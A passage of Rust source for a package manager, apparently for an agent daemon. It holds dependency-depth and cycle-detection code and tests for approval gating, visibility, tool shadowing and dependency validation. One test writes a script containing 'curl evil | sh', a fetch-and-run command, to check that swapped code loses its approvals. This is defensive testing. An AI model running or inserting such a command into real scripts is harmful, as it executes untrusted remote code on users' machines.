            let target = p.requires.clone().unwrap_or_default();
            let d = depth.get(&target).copied().unwrap_or(0);
            (1, d, target, p.package.clone())
        }
        ProblemKind::ConfigKeyUnset => {
            let d = depth.get(&p.package).copied().unwrap_or(0);
            (2, d, p.package.clone(), p.fix.clone())
        }
    }
}

/// Dependency depth of each node: 0 for a package with no (installed) deps, else
/// 1 + the max depth of its deps. Cycle-safe (a back edge contributes 0).
fn compute_depths(edges: &BTreeMap<String, Vec<String>>) -> BTreeMap<String, usize> {
    let mut memo: BTreeMap<String, usize> = BTreeMap::new();
    let mut visiting: BTreeSet<String> = BTreeSet::new();
    let nodes: Vec<String> = edges.keys().cloned().collect();
    for n in nodes {
        depth_of(&n, edges, &mut memo, &mut visiting);
    }
    memo
}

fn depth_of(
    node: &str,
    edges: &BTreeMap<String, Vec<String>>,
    memo: &mut BTreeMap<String, usize>,
    visiting: &mut BTreeSet<String>,
) -> usize {
    if let Some(d) = memo.get(node) {
        return *d;
    }
    if visiting.contains(node) {
        return 0; // back edge: don't recurse into a cycle
    }
    visiting.insert(node.to_string());
    let mut d = 0;
    if let Some(deps) = edges.get(node) {
        for dep in deps {
            d = d.max(1 + depth_of(dep, edges, memo, visiting));
        }
    }
    visiting.remove(node);
    memo.insert(node.to_string(), d);
    d
}

/// Light cycle detection: a white/gray/black DFS that, on a back edge, extracts
/// the cycle from the current path. Deduped by node set, so `a ⇄ b` yields one
/// cycle. Returns each cycle as a path `[a, …, a]` (closed).
fn find_cycles(edges: &BTreeMap<String, Vec<String>>) -> Vec<Vec<String>> {
    use packages_cycle_color::Color;
    let mut color: BTreeMap<String, Color> =
        edges.keys().map(|k| (k.clone(), Color::White)).collect();
    let mut path: Vec<String> = Vec::new();
    let mut cycles: Vec<Vec<String>> = Vec::new();
    let mut seen: BTreeSet<BTreeSet<String>> = BTreeSet::new();
    let nodes: Vec<String> = edges.keys().cloned().collect();
    for n in &nodes {
        if color.get(n).copied() == Some(Color::White) {
            dfs_cycles(n, edges, &mut color, &mut path, &mut cycles, &mut seen);
        }
    }
    cycles
}

fn dfs_cycles(
    node: &str,
    edges: &BTreeMap<String, Vec<String>>,
    color: &mut BTreeMap<String, packages_cycle_color::Color>,
    path: &mut Vec<String>,
    cycles: &mut Vec<Vec<String>>,
    seen: &mut BTreeSet<BTreeSet<String>>,
) {
    use packages_cycle_color::Color;
    color.insert(node.to_string(), Color::Gray);
    path.push(node.to_string());
    if let Some(deps) = edges.get(node) {
        for dep in deps {
            match color.get(dep).copied().unwrap_or(Color::White) {
                Color::White => dfs_cycles(dep, edges, color, path, cycles, seen),
                Color::Gray => {
                    // Back edge: the cycle is path[idx..] where path[idx] == dep.
                    if let Some(idx) = path.iter().position(|x| x == dep) {
                        let cyc_nodes: Vec<String> = path[idx..].to_vec();
                        let set: BTreeSet<String> = cyc_nodes.iter().cloned().collect();
                        if seen.insert(set) {
                            let mut closed = cyc_nodes;
                            closed.push(dep.clone());
                            cycles.push(closed);
                        }
                    }
                }
                Color::Black => {}
            }
        }
    }
    color.insert(node.to_string(), Color::Black);
    path.pop();
}

/// The unmet PACKAGE dependencies a just-approved package declares, as
/// M3-shaped nudge lines (docs/handoffs/package-dependencies.md M4). Profile-
/// agnostic — approve is a global gesture — so it checks presence + approval
/// against the instance universe, NOT a profile path. Non-refusing: the approve
/// already happened; this only nudges.
pub fn unmet_dep_nudges(root: &Root, conn: &Connection, name: &str) -> Result<Vec<String>> {
    let pkg = find(root, name)?;
    let Some(lm) = &pkg.manifest else {
        return Ok(Vec::new());
    };
    let universe: BTreeSet<String> = discover(root)?.into_iter().map(|p| p.name).collect();
    let mut out = Vec::new();
    for dep in &lm.manifest.requires.packages {
        if !universe.contains(dep) {
            out.push(format!(
                "{name} approved — but it requires `{dep}`, which is not installed on this instance."
            ));
        } else if !is_granted(conn, dep)? {
            out.push(format!(
                "{name} approved — but it requires `{dep}`, which is not yet approved. \
                 fix: elanus approve {dep}"
            ));
        }
    }
    Ok(out)
}

/// Daemon load-time warn (docs/handoffs/package-dependencies.md M4): validate the
/// profile's dependencies and LOG any problems, but only when the problem set
/// CHANGED since the last tick (a signature stored in kv) — so the daemon
/// surfaces a drifted-into-invalid config without spamming every tick, and never
/// refuses to dispatch. Returns Ok even with problems: non-refusing by design.
pub fn warn_deps_if_changed(root: &Root, conn: &Connection, profile: &str) -> Result<()> {
    let report = validate(root, conn, profile)?;
    // Compact signature of the problem set (kind|package|requires per problem).
    let sig: String = report
        .problems
        .iter()
        .map(|p| {
            format!(
                "{:?}\u{1}{}\u{1}{}",
                p.kind,
                p.package,
                p.requires.clone().unwrap_or_default()
            )
        })
        .collect::<Vec<_>>()
        .join("\u{2}");
    let key = format!("deps_warn_sig:{profile}");
    if crate::db::kv_get(conn, &key)?.as_deref() == Some(sig.as_str()) {
        return Ok(()); // unchanged — don't re-log
    }
    crate::db::kv_set(conn, &key, &sig)?;
    if !report.problems.is_empty() {
        eprintln!(
            "[daemon] profile {profile:?}: {} dependency problem(s) — run `{}` for the fix list",
            report.problems.len(),
            report.recheck()
        );
        for p in &report.problems {
            eprintln!("[daemon]   - {} (fix: {})", p.message, p.fix);
        }
    }
    Ok(())
}

/// Color enum module for the cycle DFS (kept out of the public surface).
mod packages_cycle_color {
    #[derive(Clone, Copy, PartialEq)]
    pub enum Color {
        White,
        Gray,
        Black,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::db;

    fn scratch_root(tag: &str) -> Root {
        let dir = std::env::temp_dir().join(format!("el-pkg-{tag}-{}", std::process::id()));
        std::fs::remove_dir_all(&dir).ok();
        std::fs::create_dir_all(dir.join("packages")).unwrap();
        Root { dir }
    }

    fn write_pkg(root: &Root, name: &str, manifest: &str) {
        let d = root.dir.join("packages").join(name);
        std::fs::create_dir_all(&d).unwrap();
        std::fs::write(d.join("lanius.toml"), manifest).unwrap();
    }

    #[test]
    fn requests_are_not_grants() {
        let root = scratch_root("req");
        write_pkg(
            &root,
            "p1",
            "[request]\nsubscribe = [\"in/package/p1/x\"]\n[process]\nmode=\"exec\"\nrun=\"r\"\n",
        );
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();
        // Discovered and requested, but no capability until approved.
        assert!(!is_approved(&conn, "p1", "subscribe", "in/package/p1/x").unwrap());
        assert!(matching_exec_handlers(&root, &conn, "in/package/p1/x")
            .unwrap()
            .is_empty());
        decide(&root, &conn, "p1", true, "test").unwrap();
        assert!(is_approved(&conn, "p1", "subscribe", "in/package/p1/x").unwrap());
        assert_eq!(
            matching_exec_handlers(&root, &conn, "in/package/p1/x")
                .unwrap()
                .len(),
            1
        );
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn manifest_edit_detaches_delta_carries_rest() {
        let root = scratch_root("delta");
        write_pkg(
            &root,
            "p2",
            "[request]\nsubscribe = [\"in/package/demo/a\"]\n",
        );
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();
        decide(&root, &conn, "p2", true, "test").unwrap();
        // Edit: keep in/package/demo/a, add in/package/demo/b. a carries, b pends.
        write_pkg(
            &root,
            "p2",
            "[request]\nsubscribe = [\"in/package/demo/a\", \"in/package/demo/b\"]\n",
        );
        sync(&root, &conn).unwrap();
        assert!(is_approved(&conn, "p2", "subscribe", "in/package/demo/a").unwrap());
        assert!(!is_approved(&conn, "p2", "subscribe", "in/package/demo/b").unwrap());
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn editing_script_re_gates_all_grants() {
        // F3 + carry-gate: a script swap (same declared requests) must NOT
        // carry approvals — new code is re-reviewed even though the manifest
        // and the requested filters are byte-identical.
        let root = scratch_root("codeswap");
        let d = root.dir.join("packages/p5");
        std::fs::create_dir_all(d.join("scripts")).unwrap();
        std::fs::write(d.join("lanius.toml"), "[request]\nsubscribe=[\"in/package/demo/a\"]\n[process]\nmode=\"exec\"\nrun=\"scripts/main\"\n").unwrap();
        std::fs::write(d.join("scripts/main"), "#!/bin/sh\necho ok\n").unwrap();
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();
        decide(&root, &conn, "p5", true, "test").unwrap();
        assert!(is_approved(&conn, "p5", "subscribe", "in/package/demo/a").unwrap());
        // Swap the code, leave lanius.toml untouched.
        std::fs::write(d.join("scripts/main"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
        sync(&root, &conn).unwrap();
        assert!(
            !is_approved(&conn, "p5", "subscribe", "in/package/demo/a").unwrap(),
            "a script edit must drop approvals back to pending"
        );
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn revoked_does_not_carry() {
        let root = scratch_root("revoke");
        write_pkg(
            &root,
            "p3",
            "[request]\nsubscribe = [\"in/package/demo/a\"]\n",
        );
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();
        decide(&root, &conn, "p3", true, "test").unwrap();
        decide(&root, &conn, "p3", false, "test").unwrap();
        assert!(!is_approved(&conn, "p3", "subscribe", "in/package/demo/a").unwrap());
        // New hash: the revoked value re-asks, it does not carry.
        write_pkg(
            &root,
            "p3",
            "[request]\nsubscribe = [\"in/package/demo/a\"]\n# new\n",
        );
        sync(&root, &conn).unwrap();
        assert!(!is_approved(&conn, "p3", "subscribe", "in/package/demo/a").unwrap());
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn shadowing_first_hit_wins() {
        let root = scratch_root("shadow");
        write_pkg(
            &root,
            "p4",
            "[request]\nsubscribe = [\"in/package/demo/base\"]\n",
        );
        let d = root.dir.join("override/p4");
        std::fs::create_dir_all(&d).unwrap();
        std::fs::write(
            d.join("lanius.toml"),
            "[request]\nsubscribe = [\"in/package/demo/over\"]\n",
        )
        .unwrap();
        // Path order via the profile (the env override is process-global and
        // would race parallel tests).
        let prof_dir = root.dir.join("profiles/default");
        std::fs::create_dir_all(&prof_dir).unwrap();
        std::fs::write(
            prof_dir.join("profile.toml"),
            "package_path = [\"override\", \"packages\"]\n",
        )
        .unwrap();
        let pkgs = discover(&root).unwrap();
        let p4 = pkgs.iter().find(|p| p.name == "p4").unwrap();
        assert_eq!(
            p4.manifest.as_ref().unwrap().manifest.request.subscribe,
            vec!["in/package/demo/over"]
        );
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn elanus_path_entries_can_be_kits_or_package_dirs() {
        let root = scratch_root("lanius-path");
        write_pkg(
            &root,
            "base",
            "[request]\nsubscribe = [\"in/package/base\"]\n",
        );
        let kit_pkg = root.dir.join("kits/demo/packages/kp");
        std::fs::create_dir_all(&kit_pkg).unwrap();
        std::fs::write(
            kit_pkg.join("lanius.toml"),
            "[request]\nsubscribe = [\"in/package/kp\"]\n",
        )
        .unwrap();
        let prof_dir = root.dir.join("profiles/default");
        std::fs::create_dir_all(&prof_dir).unwrap();
        std::fs::write(
            prof_dir.join("profile.toml"),
            "elanus_path = [\"kits/demo\", \"packages\"]\n",
        )
        .unwrap();
        let names: Vec<String> = discover(&root)
            .unwrap()
            .into_iter()
            .map(|p| p.name)
            .collect();
        assert!(names.contains(&"kp".to_string()));
        assert!(names.contains(&"base".to_string()));
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn inherit_to_subagents_false_excluded_under_parent() {
        // M3 (docs/handoffs/chat-rendering.md): a subagent that resolves the
        // literal "$parent" does NOT see a package marked
        // inherit_to_subagents = false, but still sees default-inheriting ones;
        // an unset flag behaves as before (inherited).
        let root = scratch_root("inherit-sub");
        // Parent (default) scope has two packages on its path:
        //  - "comms"  : inherit_to_subagents = false (the send_message package)
        //  - "memory" : unset → default true (inherits)
        write_pkg(
            &root,
            "comms",
            "inherit_to_subagents = false\n[request]\nsubscribe = [\"in/package/comms\"]\n",
        );
        write_pkg(
            &root,
            "memory",
            "[request]\nsubscribe = [\"in/package/memory\"]\n",
        );
        let default_dir = root.dir.join("profiles/default");
        std::fs::create_dir_all(&default_dir).unwrap();
        std::fs::write(
            default_dir.join("profile.toml"),
            "elanus_path = [\"packages\"]\n",
        )
        .unwrap();
        // A worker subagent whose path is purely "$parent".
        let child_dir = root.dir.join("profiles/worker");
        std::fs::create_dir_all(&child_dir).unwrap();
        std::fs::write(
            child_dir.join("profile.toml"),
            "elanus_path = [\"$parent\"]\n",
        )
        .unwrap();

        let names: Vec<String> = discover_for_profile(&root, "worker")
            .unwrap()
            .into_iter()
            .map(|p| p.name)
            .collect();
        assert!(
            !names.contains(&"comms".to_string()),
            "inherit_to_subagents=false package must be excluded under $parent (got {names:?})"
        );
        assert!(
            names.contains(&"memory".to_string()),
            "default-inheriting package must still flow down under $parent (got {names:?})"
        );

        // The parent itself (no $parent inheritance into it) still sees comms:
        // the flag only fires for an inheriting child.
        let parent_names: Vec<String> = discover_for_profile(&root, "default")
            .unwrap()
            .into_iter()
            .map(|p| p.name)
            .collect();
        assert!(
            parent_names.contains(&"comms".to_string()),
            "the owning scope still sees its own package (got {parent_names:?})"
        );

        // A child that lists the package via its OWN entry (not $parent) keeps
        // it — the exclusion is for inherited-only visibility.
        let optin_dir = root.dir.join("profiles/optin");
        std::fs::create_dir_all(&optin_dir).unwrap();
        std::fs::write(
            optin_dir.join("profile.toml"),
            "elanus_path = [\"packages\"]\n",
        )
        .unwrap();
        let optin_names: Vec<String> = discover_for_profile(&root, "optin")
            .unwrap()
            .into_iter()
            .map(|p| p.name)
            .collect();
        assert!(
            optin_names.contains(&"comms".to_string()),
            "a child reaching the package via its OWN path keeps it (got {optin_names:?})"
        );
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn withheld_builtin_tools_follows_package_visibility() {
        // M3 (docs/handoffs/chat-rendering.md): a built-in tool a package OWNS
        // via `provides_builtin_tools` is withheld from a profile that can't see
        // that package. The owning scope keeps it; a $parent worker that drops
        // the package (inherit_to_subagents=false) has it withheld; a child that
        // lists the package on its OWN path keeps it.
        let root = scratch_root("withheld-tools");
        write_pkg(
            &root,
            "comms",
            "inherit_to_subagents = false\n\
             provides_builtin_tools = [\"send_message\", \"ask_human\"]\n\
             [request]\nsubscribe = [\"in/package/comms\"]\n",
        );
        let default_dir = root.dir.join("profiles/default");
        std::fs::create_dir_all(&default_dir).unwrap();
        std::fs::write(
            default_dir.join("profile.toml"),
            "elanus_path = [\"packages\"]\n",
        )
        .unwrap();
        let worker_dir = root.dir.join("profiles/worker");
        std::fs::create_dir_all(&worker_dir).unwrap();
        std::fs::write(
            worker_dir.join("profile.toml"),
            "elanus_path = [\"$parent\"]\n",
        )
        .unwrap();
        let optin_dir = root.dir.join("profiles/optin");
        std::fs::create_dir_all(&optin_dir).unwrap();
        std::fs::write(
            optin_dir.join("profile.toml"),
            "elanus_path = [\"packages\"]\n",
        )
        .unwrap();

        // Owning scope: nothing withheld — it sees the comms package.
        assert!(
            withheld_builtin_tools(&root, "default").is_empty(),
            "owning scope must keep its own comms tools"
        );
        // Worker under $parent: the package is invisible, so BOTH tools are
        // withheld — the load-bearing M3 outcome (worker has no send_message).
        let w = withheld_builtin_tools(&root, "worker");
        assert!(
            w.contains("send_message") && w.contains("ask_human"),
            "worker dropping the comms package must have its tools withheld (got {w:?})"
        );
        // Opt-in child reaching the package via its OWN path: nothing withheld.
        assert!(
            withheld_builtin_tools(&root, "optin").is_empty(),
            "a child reaching the comms package via its own path keeps the tools"
        );
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn withheld_builtin_tools_empty_when_no_package_gates_them() {
        // M1-safety: if NO package on the profile's path owns a built-in tool,
        // the tool is never withheld — a default agent in a root that never
        // installed the comms kit still keeps send_message/ask_human.
        let root = scratch_root("withheld-none");
        write_pkg(
            &root,
            "memory",
            "[request]\nsubscribe = [\"in/package/memory\"]\n",
        );
        let default_dir = root.dir.join("profiles/default");
        std::fs::create_dir_all(&default_dir).unwrap();
        std::fs::write(
            default_dir.join("profile.toml"),
            "elanus_path = [\"packages\"]\n",
        )
        .unwrap();
        assert!(
            withheld_builtin_tools(&root, "default").is_empty(),
            "no package gates the tools, so none may be withheld"
        );
        std::fs::remove_dir_all(&root.dir).ok();
    }

    fn write_tool_pkg(root: &Root, name: &str, tool: &str) {
        let d = root.dir.join("packages").join(name);
        std::fs::create_dir_all(d.join("scripts")).unwrap();
        std::fs::write(
            d.join("lanius.toml"),
            format!("[[tool]]\nname = \"{tool}\"\nrun = \"scripts/s\"\n"),
        )
        .unwrap();
        std::fs::write(d.join("scripts/s"), "#!/bin/sh\ncat\n").unwrap();
    }

    #[test]
    fn tool_grant_is_a_request_and_second_holder_is_refused() {
        // M0 (docs/handoffs/kb-search.md): a [[tool]] is a "tool" grant request,
        // approved into the ledger like any capability. Approving a SECOND
        // package with the same bare tool name is refused loudly, naming the
        // incumbent — the engine-swap ergonomic (disable one, enable the other).
        let root = scratch_root("tool-collide");
        write_tool_pkg(&root, "eng1", "search_knowledge");
        write_tool_pkg(&root, "eng2", "search_knowledge");
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();
        // A declaration is a request, not a grant.
        assert!(!is_approved(&conn, "eng1", "tool", "search_knowledge").unwrap());
        decide(&root, &conn, "eng1", true, "test").unwrap();
        assert!(is_approved(&conn, "eng1", "tool", "search_knowledge").unwrap());

        // The second holder cannot be approved while eng1 holds the name.
        let err = decide(&root, &conn, "eng2", true, "test").unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains("eng1"), "refusal must name the holder: {msg}");
        assert!(!is_approved(&conn, "eng2", "tool", "search_knowledge").unwrap());

        // Revoke eng1, and eng2 approves cleanly — the swap.
        decide(&root, &conn, "eng1", false, "test").unwrap();
        decide(&root, &conn, "eng2", true, "test").unwrap();
        assert!(is_approved(&conn, "eng2", "tool", "search_knowledge").unwrap());
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn tool_shadowing_a_kernel_builtin_is_refused() {
        // M0: a package [[tool]] may not shadow a kernel builtin (exec::tool_defs).
        let root = scratch_root("tool-shadow");
        write_tool_pkg(&root, "sneaky", "shell");
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();
        let err = decide(&root, &conn, "sneaky", true, "test").unwrap_err();
        let msg = format!("{err:#}");
        assert!(
            msg.contains("kernel builtin"),
            "must refuse kernel-builtin shadowing: {msg}"
        );
        assert!(!is_approved(&conn, "sneaky", "tool", "shell").unwrap());
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn is_granted_tracks_approval() {
        // M2 (docs/handoffs/agent-launching.md): a package is grantable for a
        // run-scoped visibility extension only once approved. Pending → false;
        // approved → true; a manifest-less pure-skill package → true (nothing to
        // approve).
        let root = scratch_root("is-granted");
        write_pkg(
            &root,
            "cap",
            "[request]\nsubscribe = [\"in/package/cap/x\"]\n",
        );
        // A pure-skill package: a bare dir, no lanius.toml.
        std::fs::create_dir_all(root.dir.join("packages/skillonly")).unwrap();
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();
        assert!(!is_granted(&conn, "cap").unwrap(), "pending is not granted");
        assert!(
            is_granted(&conn, "skillonly").unwrap(),
            "a pure-skill package has nothing to approve → granted"
        );
        decide(&root, &conn, "cap", true, "test").unwrap();
        assert!(is_granted(&conn, "cap").unwrap(), "approved is granted");
        decide(&root, &conn, "cap", false, "test").unwrap();
        assert!(!is_granted(&conn, "cap").unwrap(), "revoked is not granted");
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn run_scoped_env_widens_visibility() {
        // M2: LANIUS_WITH_PACKAGES unions instance-universe packages into a
        // profile's visible set for the run, even when the profile's own path
        // excludes them — the run-scoped analog of elanus_path. Unique package
        // name so the process-global env can't contaminate a parallel test.
        let root = scratch_root("runscope");
        write_pkg(
            &root,
            "runscopeextra",
            "[request]\nsubscribe = [\"in/package/runscopeextra/x\"]\n",
        );
        // A profile whose path excludes packages/ → cannot see runscopeextra.
        let wdir = root.dir.join("profiles/worker");
        std::fs::create_dir_all(&wdir).unwrap();
        std::fs::write(wdir.join("profile.toml"), "elanus_path = [\"empty\"]\n").unwrap();

        let base: Vec<String> = discover_for_profile(&root, "worker")
            .unwrap()
            .into_iter()
            .map(|p| p.name)
            .collect();
        assert!(!base.contains(&"runscopeextra".to_string()));

        std::env::set_var(RUN_SCOPED_PACKAGES_ENV, "runscopeextra");
        let widened: Vec<String> = discover_for_profile(&root, "worker")
            .unwrap()
            .into_iter()
            .map(|p| p.name)
            .collect();
        std::env::remove_var(RUN_SCOPED_PACKAGES_ENV);
        assert!(
            widened.contains(&"runscopeextra".to_string()),
            "run-scoped env must widen the visible set (got {widened:?})"
        );
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn profile_elanus_path_can_prepend_parent_scope() {
        let root = scratch_root("profile-el-path");
        write_pkg(
            &root,
            "base",
            "[request]\nsubscribe = [\"in/package/base\"]\n",
        );
        let override_pkg = root.dir.join("override/extra");
        std::fs::create_dir_all(&override_pkg).unwrap();
        std::fs::write(
            override_pkg.join("lanius.toml"),
            "[request]\nsubscribe = [\"in/package/extra\"]\n",
        )
        .unwrap();
        let default_dir = root.dir.join("profiles/default");
        std::fs::create_dir_all(&default_dir).unwrap();
        std::fs::write(
            default_dir.join("profile.toml"),
            "elanus_path = [\"packages\"]\n",
        )
        .unwrap();
        let child_dir = root.dir.join("profiles/child");
        std::fs::create_dir_all(&child_dir).unwrap();
        std::fs::write(
            child_dir.join("profile.toml"),
            "elanus_path = [\"override\", \"$parent\"]\n",
        )
        .unwrap();
        let names: Vec<String> = discover_for_profile(&root, "child")
            .unwrap()
            .into_iter()
            .map(|p| p.name)
            .collect();
        assert_eq!(
            profile::effective_elanus_path(&root, "child").unwrap(),
            vec!["override", "packages"]
        );
        assert!(names.contains(&"extra".to_string()));
        assert!(names.contains(&"base".to_string()));
        std::fs::remove_dir_all(&root.dir).ok();
    }

    // --- package-dependencies M2/M3 (docs/handoffs/package-dependencies.md) ---

    #[test]
    fn validate_the_worked_example_no_llm() {
        // M2 acceptance: recall requires phonebook, both on path, phonebook
        // unapproved → exactly one PackageNotApproved with fix `elanus approve
        // phonebook`. Approve → valid. Off-path → PackageOffPath (enable
        // guidance). Deterministic (run twice, byte-identical).
        let root = scratch_root("validate-worked");
        write_pkg(
            &root,
            "phonebook",
            "[request]\nsubscribe = [\"in/package/phonebook/x\"]\n",
        );
        write_pkg(&root, "recall", "[requires]\npackages = [\"phonebook\"]\n");
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();

        // phonebook unapproved → one PackageNotApproved problem.
        let r = validate(&root, &conn, "default").unwrap();
        assert_eq!(r.problems.len(), 1, "exactly one problem: {:?}", r.problems);
        let p = &r.problems[0];
        assert_eq!(p.kind, ProblemKind::PackageNotApproved);
        assert_eq!(p.package, "recall");
        assert_eq!(p.requires.as_deref(), Some("phonebook"));
        assert_eq!(p.fix, "elanus approve phonebook");
        assert!(!r.is_ok());

        // Determinism: run twice, byte-identical human report.
        let r2 = validate(&root, &conn, "default").unwrap();
        assert_eq!(r.human(), r2.human());

        // Running the exact fix resolves it: approve phonebook → valid.
        decide(&root, &conn, "phonebook", true, "test").unwrap();
        let r = validate(&root, &conn, "default").unwrap();
        assert!(r.is_ok(), "approving the dep clears the problem: {:?}", r.problems);
        assert!(r.human().starts_with("OK — profile \"default\""));

        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn validate_off_path_dependency_uses_enable_guidance() {
        // M2: dep installed but off the profile's path → PackageOffPath whose fix
        // is the reused enable-guidance, NOT the approve command.
        let root = scratch_root("validate-offpath");
        write_pkg(
            &root,
            "phonebook",
            "[request]\nsubscribe = [\"in/package/phonebook/x\"]\n",
        );
        // recall lives in an `extra/` dir off the worker profile's path.
        let recall_dir = root.dir.join("extra/recall");
        std::fs::create_dir_all(&recall_dir).unwrap();
        std::fs::write(
            recall_dir.join("lanius.toml"),
            "[requires]\npackages = [\"phonebook\"]\n",
        )
        .unwrap();
        // Worker profile: path is extra/ only → phonebook is in the universe
        // (packages/) but off this profile's path.
        let wdir = root.dir.join("profiles/worker");
        std::fs::create_dir_all(&wdir).unwrap();
        std::fs::write(wdir.join("profile.toml"), "elanus_path = [\"extra\"]\n").unwrap();
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();

        let r = validate(&root, &conn, "worker").unwrap();
        let p = r
            .problems
            .iter()
            .find(|p| p.requires.as_deref() == Some("phonebook"))
            .expect("phonebook surfaces as a problem");
        assert_eq!(p.kind, ProblemKind::PackageOffPath);
        assert!(
            p.fix.contains("config-proposal"),
            "off-path fix is the enable-guidance, not a bare approve: {}",
            p.fix
        );
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn validate_not_installed_dependency() {
        // M2: a dep absent from the universe → PackageNotInstalled.
        let root = scratch_root("validate-absent");
        write_pkg(&root, "recall", "[requires]\npackages = [\"phonebook\"]\n");
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();
        let r = validate(&root, &conn, "default").unwrap();
        assert_eq!(r.problems.len(), 1);
        assert_eq!(r.problems[0].kind, ProblemKind::PackageNotInstalled);
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn validate_config_key_unset() {
        // M2: a visible package with a `required` config key that is unset →
        // ConfigKeyUnset with an `elanus config set <pkg> <key> …` fix. A package
        // with no [requires] and no required keys never appears.
        let root = scratch_root("validate-cfg");
        write_pkg(
            &root,
            "telegram",
            "[[config.keys]]\nname = \"TELEGRAM_TOKEN\"\ndescription = \"bot token\"\n",
        );
        write_pkg(&root, "quiet", "[request]\nsubscribe = [\"in/package/quiet/x\"]\n");
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();
        let r = validate(&root, &conn, "default").unwrap();
        let p = r
            .problems
            .iter()
            .find(|p| p.kind == ProblemKind::ConfigKeyUnset)
            .expect("the unset required key surfaces");
        assert_eq!(p.package, "telegram");
        assert_eq!(p.fix, "elanus config set telegram TELEGRAM_TOKEN <value>");
        assert!(
            !r.problems.iter().any(|p| p.package == "quiet"),
            "a package with no deps and no required keys never appears"
        );
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn validate_detects_a_cycle() {
        // M2: a ⇄ b requiring each other → exactly one DependencyCycle naming the
        // loop, with a fix that names an edge to remove.
        let root = scratch_root("validate-cycle");
        write_pkg(&root, "a", "[requires]\npackages = [\"b\"]\n");
        write_pkg(&root, "b", "[requires]\npackages = [\"a\"]\n");
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();
        let r = validate(&root, &conn, "default").unwrap();
        let cycles: Vec<_> = r
            .problems
            .iter()
            .filter(|p| p.kind == ProblemKind::DependencyCycle)
            .collect();
        assert_eq!(cycles.len(), 1, "one cycle problem: {:?}", r.problems);
        assert!(
            cycles[0].message.contains("→"),
            "the cycle message names the loop: {}",
            cycles[0].message
        );
        assert!(cycles[0].fix.contains("remove"));
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn report_is_ordered_and_each_fix_resolves_its_item() {
        // M3: the worked telegram+recall example. Ordered so running the fixes
        // top-to-bottom converges (approve phonebook, then recall, then config
        // last), and each `fix:` line is the exact command that drops that item.
        let root = scratch_root("report-order");
        write_pkg(
            &root,
            "phonebook",
            "[request]\nsubscribe = [\"in/package/phonebook/x\"]\n",
        );
        // recall carries a capability so it must itself be approved (mirrors the
        // real recall's [[stage]]); otherwise a grant-less dep is trivially granted.
        write_pkg(
            &root,
            "recall",
            "[requires]\npackages = [\"phonebook\"]\n[request]\nsubscribe = [\"in/package/recall/x\"]\n",
        );
        write_pkg(
            &root,
            "telegram",
            "[requires]\npackages = [\"phonebook\", \"recall\"]\n\
             [[config.keys]]\nname = \"TELEGRAM_TOKEN\"\ndescription = \"bot token\"\n",
        );
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();

        let r = validate(&root, &conn, "default").unwrap();
        // Problems: recall→phonebook, telegram→phonebook, telegram→recall,
        // telegram config. Ordered: phonebook approvals (depth 0) before recall
        // (depth 1); config last.
        let kinds: Vec<&str> = r
            .problems
            .iter()
            .map(|p| match p.kind {
                ProblemKind::ConfigKeyUnset => "config",
                _ => p.requires.as_deref().unwrap_or("?"),
            })
            .collect();
        // First fixes target phonebook (depth 0), then recall (depth 1); config last.
        assert_eq!(*kinds.first().unwrap(), "phonebook");
        assert_eq!(*kinds.last().unwrap(), "config");
        let cfg_idx = kinds.iter().position(|k| *k == "config").unwrap();
        let recall_idx = kinds.iter().position(|k| *k == "recall").unwrap();
        assert!(recall_idx < cfg_idx, "config comes after the recall approval");

        // The human report is self-contained: names the profile, ends with the
        // exact re-check command.
        let human = r.human();
        assert!(human.contains("profile \"default\""));
        assert!(human.trim_end().ends_with("elanus packages check --profile default"));

        // Each `fix:` line is exact: approve phonebook then re-check drops the
        // phonebook items. Approve in dependency order.
        decide(&root, &conn, "phonebook", true, "test").unwrap();
        let r2 = validate(&root, &conn, "default").unwrap();
        assert!(
            !r2.problems.iter().any(|p| p.requires.as_deref() == Some("phonebook")),
            "approving phonebook drops both phonebook items"
        );
        decide(&root, &conn, "recall", true, "test").unwrap();
        // Run the EMITTED config fix verbatim (not a hand-written file): parse the
        // `elanus config set <pkg> <key> <value>` line the report produced the same
        // way the CLI does — the three space-separated positionals after `set` map
